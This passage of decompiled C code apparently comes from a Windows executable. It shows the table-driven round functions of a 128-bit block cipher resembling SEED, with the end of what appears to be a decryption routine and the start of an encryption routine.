                                                                                          + 512] ^ dword_140118300[((unsigned int)(v8 + v5) >> 24) + 768];
  v10 = dword_140118300[(unsigned __int8)(v9 + v8)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v9 + v8) >> 8)
                                                                    + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v9 + v8) >> 16)
                                                                                           + 512] ^ dword_140118300[((unsigned int)(v9 + v8) >> 24) + 768];
  v11 = (v10 + v9) ^ (a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8));
  v12 = v11 ^ *(_DWORD *)(a3 + 112);
  v13 = v10 ^ (a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8));
  v14 = dword_140118300[(unsigned __int8)(v13 ^ v12 ^ *(_BYTE *)(a3 + 116))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v13 ^ v12 ^ *(_WORD *)(a3 + 116)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v13 ^ (unsigned int)v12 ^ *(_DWORD *)(a3 + 116)) >> 16) + 512] ^ dword_140118300[((v13 ^ (unsigned int)v12 ^ *(_DWORD *)(a3 + 116)) >> 24) + 768];
  v15 = dword_140118300[(unsigned __int8)(v14 + v12)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v14 + v12) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v14 + v12) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v14 + v12) >> 24) + 768];
  v16 = dword_140118300[(unsigned __int8)(v15 + v14)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v15 + v14) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v15 + v14) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v15 + v14) >> 24) + 768];
  v17 = v16 ^ v6;
  v18 = (v16 + v15) ^ v4;
  v19 = v18 ^ *(_DWORD *)(a3 + 104);
  v20 = dword_140118300[(unsigned __int8)(v17 ^ v19 ^ *(_BYTE *)(a3 + 108))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v17 ^ v19 ^ *(_WORD *)(a3 + 108)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v17 ^ (unsigned int)v19 ^ *(_DWORD *)(a3 + 108)) >> 16) + 512] ^ dword_140118300[((v17 ^ (unsigned int)v19 ^ *(_DWORD *)(a3 + 108)) >> 24) + 768];
  v21 = dword_140118300[(unsigned __int8)(v20 + v19)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v20 + v19) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v20 + v19) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v20 + v19) >> 24) + 768];
  v22 = dword_140118300[(unsigned __int8)(v21 + v20)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v21 + v20) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v21 + v20) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v21 + v20) >> 24) + 768];
  v23 = v22 ^ v13;
  v24 = (v22 + v21) ^ v11;
  v25 = v24 ^ *(_DWORD *)(a3 + 96);
  v26 = dword_140118300[(unsigned __int8)(v23 ^ v25 ^ *(_BYTE *)(a3 + 100))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v23 ^ v25 ^ *(_WORD *)(a3 + 100)) >> 8)
                                                                                             + 256] ^ dword_140118300[(unsigned __int8)((v23 ^ (unsigned int)v25 ^ *(_DWORD *)(a3 + 100)) >> 16) + 512] ^ dword_140118300[((v23 ^ (unsigned int)v25 ^ *(_DWORD *)(a3 + 100)) >> 24) + 768];
  v27 = dword_140118300[(unsigned __int8)(v26 + v25)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v26 + v25) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v26 + v25) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v26 + v25) >> 24) + 768];
  v28 = dword_140118300[(unsigned __int8)(v27 + v26)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v27 + v26) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v27 + v26) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v27 + v26) >> 24) + 768];
  v29 = v28 ^ v17;
  v30 = (v28 + v27) ^ v18;
  v31 = v30 ^ *(_DWORD *)(a3 + 88);
  v32 = dword_140118300[(unsigned __int8)(v29 ^ v31 ^ *(_BYTE *)(a3 + 92))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v29 ^ v31 ^ *(_WORD *)(a3 + 92)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v29 ^ (unsigned int)v31 ^ *(_DWORD *)(a3 + 92)) >> 16) + 512] ^ dword_140118300[((v29 ^ (unsigned int)v31 ^ *(_DWORD *)(a3 + 92)) >> 24) + 768];
  v33 = dword_140118300[(unsigned __int8)(v32 + v31)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v32 + v31) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v32 + v31) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v32 + v31) >> 24) + 768];
  v34 = dword_140118300[(unsigned __int8)(v33 + v32)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v33 + v32) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v33 + v32) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v33 + v32) >> 24) + 768];
  v35 = v34 ^ v23;
  v36 = (v34 + v33) ^ v24;
  v37 = v36 ^ *(_DWORD *)(a3 + 80);
  v38 = dword_140118300[(unsigned __int8)(v35 ^ v37 ^ *(_BYTE *)(a3 + 84))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v35 ^ v37 ^ *(_WORD *)(a3 + 84)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v35 ^ (unsigned int)v37 ^ *(_DWORD *)(a3 + 84)) >> 16) + 512] ^ dword_140118300[((v35 ^ (unsigned int)v37 ^ *(_DWORD *)(a3 + 84)) >> 24) + 768];
  v39 = dword_140118300[(unsigned __int8)(v38 + v37)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v38 + v37) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v38 + v37) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v38 + v37) >> 24) + 768];
  v40 = dword_140118300[(unsigned __int8)(v39 + v38)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v39 + v38) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v39 + v38) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v39 + v38) >> 24) + 768];
  v41 = v40 ^ v29;
  v42 = (v40 + v39) ^ v30;
  v43 = v42 ^ *(_DWORD *)(a3 + 72);
  v44 = dword_140118300[(unsigned __int8)(v41 ^ v43 ^ *(_BYTE *)(a3 + 76))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v41 ^ v43 ^ *(_WORD *)(a3 + 76)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v41 ^ (unsigned int)v43 ^ *(_DWORD *)(a3 + 76)) >> 16) + 512] ^ dword_140118300[((v41 ^ (unsigned int)v43 ^ *(_DWORD *)(a3 + 76)) >> 24) + 768];
  v45 = dword_140118300[(unsigned __int8)(v44 + v43)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v44 + v43) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v44 + v43) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v44 + v43) >> 24) + 768];
  v46 = dword_140118300[(unsigned __int8)(v45 + v44)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v45 + v44) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v45 + v44) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v45 + v44) >> 24) + 768];
  v47 = (v46 + v45) ^ v36;
  v48 = v46 ^ v35;
  v49 = v47 ^ *(_DWORD *)(a3 + 64);
  v50 = dword_140118300[(unsigned __int8)(v48 ^ v49 ^ *(_BYTE *)(a3 + 68))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v48 ^ v49 ^ *(_WORD *)(a3 + 68)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v48 ^ (unsigned int)v49 ^ *(_DWORD *)(a3 + 68)) >> 16) + 512] ^ dword_140118300[((v48 ^ (unsigned int)v49 ^ *(_DWORD *)(a3 + 68)) >> 24) + 768];
  v51 = dword_140118300[(unsigned __int8)(v50 + v49)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v50 + v49) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v50 + v49) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v50 + v49) >> 24) + 768];
  v52 = dword_140118300[(unsigned __int8)(v51 + v50)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v51 + v50) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v51 + v50) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v51 + v50) >> 24) + 768];
  v53 = v52 ^ v41;
  v54 = (v52 + v51) ^ v42;
  v55 = v54 ^ *(_DWORD *)(a3 + 56);
  v56 = dword_140118300[(unsigned __int8)(v53 ^ v55 ^ *(_BYTE *)(a3 + 60))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v53 ^ v55 ^ *(_WORD *)(a3 + 60)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v53 ^ (unsigned int)v55 ^ *(_DWORD *)(a3 + 60)) >> 16) + 512] ^ dword_140118300[((v53 ^ (unsigned int)v55 ^ *(_DWORD *)(a3 + 60)) >> 24) + 768];
  v57 = dword_140118300[(unsigned __int8)(v56 + v55)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v56 + v55) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v56 + v55) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v56 + v55) >> 24) + 768];
  v58 = dword_140118300[(unsigned __int8)(v57 + v56)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v57 + v56) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v57 + v56) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v57 + v56) >> 24) + 768];
  v59 = v58 ^ v48;
  v60 = (v58 + v57) ^ v47;
  v61 = v60 ^ *(_DWORD *)(a3 + 48);
  v62 = dword_140118300[(unsigned __int8)(v59 ^ v61 ^ *(_BYTE *)(a3 + 52))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v59 ^ v61 ^ *(_WORD *)(a3 + 52)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v59 ^ (unsigned int)v61 ^ *(_DWORD *)(a3 + 52)) >> 16) + 512] ^ dword_140118300[((v59 ^ (unsigned int)v61 ^ *(_DWORD *)(a3 + 52)) >> 24) + 768];
  v63 = dword_140118300[(unsigned __int8)(v62 + v61)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v62 + v61) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v62 + v61) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v62 + v61) >> 24) + 768];
  v64 = dword_140118300[(unsigned __int8)(v63 + v62)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v63 + v62) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v63 + v62) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v63 + v62) >> 24) + 768];
  v65 = v64 ^ v53;
  v66 = (v64 + v63) ^ v54;
  v67 = v66 ^ *(_DWORD *)(a3 + 40);
  v68 = dword_140118300[(unsigned __int8)(v65 ^ v67 ^ *(_BYTE *)(a3 + 44))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v65 ^ v67 ^ *(_WORD *)(a3 + 44)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v65 ^ (unsigned int)v67 ^ *(_DWORD *)(a3 + 44)) >> 16) + 512] ^ dword_140118300[((v65 ^ (unsigned int)v67 ^ *(_DWORD *)(a3 + 44)) >> 24) + 768];
  v69 = dword_140118300[(unsigned __int8)(v68 + v67)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v68 + v67) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v68 + v67) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v68 + v67) >> 24) + 768];
  v70 = dword_140118300[(unsigned __int8)(v69 + v68)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v69 + v68) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v69 + v68) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v69 + v68) >> 24) + 768];
  v71 = v70 ^ v59;
  v72 = (v70 + v69) ^ v60;
  v73 = v72 ^ *(_DWORD *)(a3 + 32);
  v74 = dword_140118300[(unsigned __int8)(v71 ^ v73 ^ *(_BYTE *)(a3 + 36))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v71 ^ v73 ^ *(_WORD *)(a3 + 36)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v71 ^ (unsigned int)v73 ^ *(_DWORD *)(a3 + 36)) >> 16) + 512] ^ dword_140118300[((v71 ^ (unsigned int)v73 ^ *(_DWORD *)(a3 + 36)) >> 24) + 768];
  v75 = dword_140118300[(unsigned __int8)(v74 + v73)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v74 + v73) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v74 + v73) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v74 + v73) >> 24) + 768];
  v76 = dword_140118300[(unsigned __int8)(v75 + v74)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v75 + v74) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v75 + v74) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v75 + v74) >> 24) + 768];
  v77 = v76 ^ v65;
  v78 = (v76 + v75) ^ v66;
  v79 = v78 ^ *(_DWORD *)(a3 + 24);
  v80 = dword_140118300[(unsigned __int8)(v77 ^ v79 ^ *(_BYTE *)(a3 + 28))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v77 ^ v79 ^ *(_WORD *)(a3 + 28)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v77 ^ (unsigned int)v79 ^ *(_DWORD *)(a3 + 28)) >> 16) + 512] ^ dword_140118300[((v77 ^ (unsigned int)v79 ^ *(_DWORD *)(a3 + 28)) >> 24) + 768];
  v81 = dword_140118300[(unsigned __int8)(v80 + v79)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v80 + v79) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v80 + v79) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v80 + v79) >> 24) + 768];
  v82 = dword_140118300[(unsigned __int8)(v81 + v80)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v81 + v80) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v81 + v80) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v81 + v80) >> 24) + 768];
  v83 = v82 ^ v71;
  v84 = (v82 + v81) ^ v72;
  v85 = v84 ^ *(_DWORD *)(a3 + 16);
  v86 = dword_140118300[(unsigned __int8)(v83 ^ v85 ^ *(_BYTE *)(a3 + 20))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v83 ^ v85 ^ *(_WORD *)(a3 + 20)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v83 ^ (unsigned int)v85 ^ *(_DWORD *)(a3 + 20)) >> 16) + 512] ^ dword_140118300[((v83 ^ (unsigned int)v85 ^ *(_DWORD *)(a3 + 20)) >> 24) + 768];
  v87 = dword_140118300[(unsigned __int8)(v86 + v85)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v86 + v85) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v86 + v85) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v86 + v85) >> 24) + 768];
  v88 = dword_140118300[(unsigned __int8)(v87 + v86)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v87 + v86) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v87 + v86) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v87 + v86) >> 24) + 768];
  v89 = v88 ^ v77;
  v90 = (v88 + v87) ^ v78;
  v91 = v90 ^ *(_DWORD *)(a3 + 8);
  v92 = dword_140118300[(unsigned __int8)(v89 ^ v91 ^ *(_BYTE *)(a3 + 12))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v89 ^ v91 ^ *(_WORD *)(a3 + 12)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v89 ^ (unsigned int)v91 ^ *(_DWORD *)(a3 + 12)) >> 16) + 512] ^ dword_140118300[((v89 ^ (unsigned int)v91 ^ *(_DWORD *)(a3 + 12)) >> 24) + 768];
  v93 = dword_140118300[(unsigned __int8)(v92 + v91)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v92 + v91) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v92 + v91) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v92 + v91) >> 24) + 768];
  v94 = dword_140118300[(unsigned __int8)(v93 + v92)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v93 + v92) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v93 + v92) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v93 + v92) >> 24) + 768];
  v95 = v94 ^ v83;
  v96 = (v94 + v93) ^ v84;
  v97 = v96 ^ *(_DWORD *)a3;
  v98 = dword_140118300[(unsigned __int8)(v95 ^ v97 ^ *(_BYTE *)(a3 + 4))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v95 ^ v97 ^ *(_WORD *)(a3 + 4)) >> 8)
                                                                                           + 256] ^ dword_140118300[(unsigned __int8)((v95 ^ v97 ^ *(_DWORD *)(a3 + 4)) >> 16) + 512] ^ dword_140118300[((v95 ^ v97 ^ *(_DWORD *)(a3 + 4)) >> 24) + 768];
  v99 = dword_140118300[(unsigned __int8)(v98 + v97)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v98 + v97) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v98 + v97) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v98 + v97) >> 24) + 768];
  v100 = dword_140118300[(unsigned __int8)(v99 + v98)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v99 + v98) >> 8)
                                                                       + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v99 + v98) >> 16)
                                                                                              + 512] ^ dword_140118300[((unsigned int)(v99 + v98) >> 24) + 768];
  v101 = v100 ^ v89;
  v102 = (v100 + v99) ^ v90;
  a2[3] = v102;
  *a2 = HIBYTE(v102);
  a2[1] = BYTE2(v102);
  a2[2] = BYTE1(v102);
  a2[4] = HIBYTE(v101);
  a2[5] = BYTE2(v101);
  a2[6] = BYTE1(v101);
  a2[8] = HIBYTE(v96);
  a2[9] = BYTE2(v96);
  a2[10] = BYTE1(v96);
  a2[12] = HIBYTE(v95);
  a2[13] = BYTE2(v95);
  result = v95 >> 8;
  a2[7] = v101;
  a2[11] = v96;
  a2[15] = v95;
  a2[14] = BYTE1(v95);
  return result;
}
// 140118300: using guessed type _DWORD dword_140118300[1024];

//----- (00000001400970C0) ----------------------------------------------------
__int64 __fastcall sub_1400970C0(unsigned __int8 *a1, _BYTE *a2, __int64 a3)
{
  int v4; // r15d
  int v5; // r9d
  int v6; // ebp
  int v7; // r8d
  int v8; // r11d
  int v9; // r10d
  int v10; // r8d
  int v11; // esi
  int v12; // r10d
  int v13; // edi
  int v14; // r11d
  int v15; // r9d
  int v16; // r8d
  int v17; // ebp
  int v18; // r15d
  int v19; // r10d
  int v20; // r11d
  int v21; // r9d
  int v22; // r8d
  int v23; // edi
  int v24; // esi
  int v25; // r10d
  int v26; // r11d
  int v27; // r9d
  int v28; // r8d
  int v29; // ebp
  int v30; // r15d
  int v31; // r10d
  int v32; // r11d
  int v33; // r9d
  int v34; // r8d
  int v35; // edi
  int v36; // esi
  int v37; // r10d
  int v38; // r11d
  int v39; // r9d
  int v40; // r8d
  int v41; // ebp
  int v42; // r15d
  int v43; // r10d
  int v44; // r11d
  int v45; // r9d
  int v46; // r8d
  int v47; // esi
  int v48; // edi
  int v49; // r10d
  int v50; // r11d
  int v51; // r9d
  int v52; // r8d
  int v53; // ebp
  int v54; // r15d
  int v55; // r10d
  int v56; // r11d
  int v57; // r9d
  int v58; // r8d
  int v59; // edi
  int v60; // esi
  int v61; // r10d
  int v62; // r11d
  int v63; // r9d
  int v64; // r8d
  int v65; // ebp
  int v66; // r15d
  int v67; // r10d
  int v68; // r11d
  int v69; // r9d
  int v70; // r8d
  int v71; // edi
  int v72; // esi
  int v73; // r10d
  int v74; // r11d
  int v75; // r9d
  int v76; // r8d
  int v77; // ebp
  int v78; // r15d
  int v79; // r10d
  int v80; // r11d
  int v81; // r9d
  int v82; // r8d
  int v83; // edi
  int v84; // esi
  int v85; // r10d
  int v86; // r11d
  int v87; // r9d
  int v88; // r8d
  int v89; // ebp
  int v90; // r15d
  int v91; // r10d
  int v92; // r11d
  int v93; // r9d
  int v94; // r8d
  unsigned int v95; // edi
  int v96; // esi
  int v97; // r10d
  int v98; // r11d
  int v99; // r9d
  int v100; // r8d
  int v101; // ebp
  int v102; // r15d
  __int64 result; // rax

  v4 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v5 = v4 ^ *(_DWORD *)a3;
  v6 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  v7 = v6 ^ v5 ^ *(_DWORD *)(a3 + 4);
  v8 = dword_140118300[(unsigned __int8)v7] ^ dword_140118300[BYTE1(v7) + 256] ^ dword_140118300[BYTE2(v7) + 512] ^ dword_140118300[HIBYTE(v7) + 768];
  v9 = dword_140118300[(unsigned __int8)(v8 + v5)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v8 + v5) >> 8)
                                                                   + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v8 + v5) >> 16)
                                                                                          + 512] ^ dword_140118300[((unsigned int)(v8 + v5) >> 24) + 768];
  v10 = dword_140118300[(unsigned __int8)(v9 + v8)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v9 + v8) >> 8)
                                                                    + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v9 + v8) >> 16)
                                                                                           + 512] ^ dword_140118300[((unsigned int)(v9 + v8) >> 24) + 768];
  v11 = (v10 + v9) ^ (a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8));
  v12 = v11 ^ *(_DWORD *)(a3 + 8);
  v13 = v10 ^ (a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8));
  v14 = dword_140118300[(unsigned __int8)(v13 ^ v12 ^ *(_BYTE *)(a3 + 12))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v13 ^ v12 ^ *(_WORD *)(a3 + 12)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v13 ^ (unsigned int)v12 ^ *(_DWORD *)(a3 + 12)) >> 16) + 512] ^ dword_140118300[((v13 ^ (unsigned int)v12 ^ *(_DWORD *)(a3 + 12)) >> 24) + 768];
  v15 = dword_140118300[(unsigned __int8)(v14 + v12)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v14 + v12) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v14 + v12) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v14 + v12) >> 24) + 768];
  v16 = dword_140118300[(unsigned __int8)(v15 + v14)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v15 + v14) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v15 + v14) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v15 + v14) >> 24) + 768];
  v17 = v16 ^ v6;
  v18 = (v16 + v15) ^ v4;
  v19 = v18 ^ *(_DWORD *)(a3 + 16);
  v20 = dword_140118300[(unsigned __int8)(v17 ^ v19 ^ *(_BYTE *)(a3 + 20))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v17 ^ v19 ^ *(_WORD *)(a3 + 20)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v17 ^ (unsigned int)v19 ^ *(_DWORD *)(a3 + 20)) >> 16) + 512] ^ dword_140118300[((v17 ^ (unsigned int)v19 ^ *(_DWORD *)(a3 + 20)) >> 24) + 768];
  v21 = dword_140118300[(unsigned __int8)(v20 + v19)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v20 + v19) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v20 + v19) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v20 + v19) >> 24) + 768];
  v22 = dword_140118300[(unsigned __int8)(v21 + v20)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v21 + v20) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v21 + v20) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v21 + v20) >> 24) + 768];
  v23 = v22 ^ v13;
  v24 = (v22 + v21) ^ v11;
  v25 = v24 ^ *(_DWORD *)(a3 + 24);
  v26 = dword_140118300[(unsigned __int8)(v23 ^ v25 ^ *(_BYTE *)(a3 + 28))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v23 ^ v25 ^ *(_WORD *)(a3 + 28)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v23 ^ (unsigned int)v25 ^ *(_DWORD *)(a3 + 28)) >> 16) + 512] ^ dword_140118300[((v23 ^ (unsigned int)v25 ^ *(_DWORD *)(a3 + 28)) >> 24) + 768];
  v27 = dword_140118300[(unsigned __int8)(v26 + v25)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v26 + v25) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v26 + v25) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v26 + v25) >> 24) + 768];
  v28 = dword_140118300[(unsigned __int8)(v27 + v26)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v27 + v26) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v27 + v26) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v27 + v26) >> 24) + 768];
  v29 = v28 ^ v17;
  v30 = (v28 + v27) ^ v18;
  v31 = v30 ^ *(_DWORD *)(a3 + 32);
  v32 = dword_140118300[(unsigned __int8)(v29 ^ v31 ^ *(_BYTE *)(a3 + 36))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v29 ^ v31 ^ *(_WORD *)(a3 + 36)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v29 ^ (unsigned int)v31 ^ *(_DWORD *)(a3 + 36)) >> 16) + 512] ^ dword_140118300[((v29 ^ (unsigned int)v31 ^ *(_DWORD *)(a3 + 36)) >> 24) + 768];
  v33 = dword_140118300[(unsigned __int8)(v32 + v31)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v32 + v31) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v32 + v31) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v32 + v31) >> 24) + 768];
  v34 = dword_140118300[(unsigned __int8)(v33 + v32)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v33 + v32) >> 8)
                                                                      + 256] ^ dword_140118300[(unsigned __int8)((unsigned int)(v33 + v32) >> 16)
                                                                                             + 512] ^ dword_140118300[((unsigned int)(v33 + v32) >> 24) + 768];
  v35 = v34 ^ v23;
  v36 = (v34 + v33) ^ v24;
  v37 = v36 ^ *(_DWORD *)(a3 + 40);
  v38 = dword_140118300[(unsigned __int8)(v35 ^ v37 ^ *(_BYTE *)(a3 + 44))] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v35 ^ v37 ^ *(_WORD *)(a3 + 44)) >> 8)
                                                                                            + 256] ^ dword_140118300[(unsigned __int8)((v35 ^ (unsigned int)v37 ^ *(_DWORD *)(a3 + 44)) >> 16) + 512] ^ dword_140118300[((v35 ^ (unsigned int)v37 ^ *(_DWORD *)(a3 + 44)) >> 24) + 768];
  v39 = dword_140118300[(unsigned __int8)(v38 + v37)] ^ dword_140118300[(unsigned __int8)((unsigned __int16)(v38 + v37) >> 8)
